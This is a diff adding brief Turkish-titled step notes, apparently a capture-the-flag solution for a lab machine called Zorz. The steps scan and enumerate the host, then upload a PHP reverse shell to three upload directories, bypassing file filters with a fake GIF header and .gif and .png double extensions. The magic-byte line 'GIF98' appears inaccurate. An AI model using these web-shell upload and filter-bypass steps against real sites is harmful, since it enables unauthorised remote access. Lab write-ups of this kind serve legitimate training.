@@ -1,0 +1,11 @@
+ZORZ MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.129 bulundu.
+2 - nmap -sT -A 192.168.2.129
+3 - gobuster dir -u http://192.168.2.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - cp /usr/share/webshells/php/php-reverse-shell.php .
+5 - Upload php, http://192.168.2.129/uploads1/
+6 - First Line: GIF98 - php-reverse-shell.php
+7 - cp php-reverse-shell.php php-reverse-shell.php.gif
+8 - Upload php, http://192.168.2.129/uploads2/
+9 - cp php-reverse-shell.php php-reverse-shell.php.png
+10 - Upload php, http://192.168.2.129/uploads3/
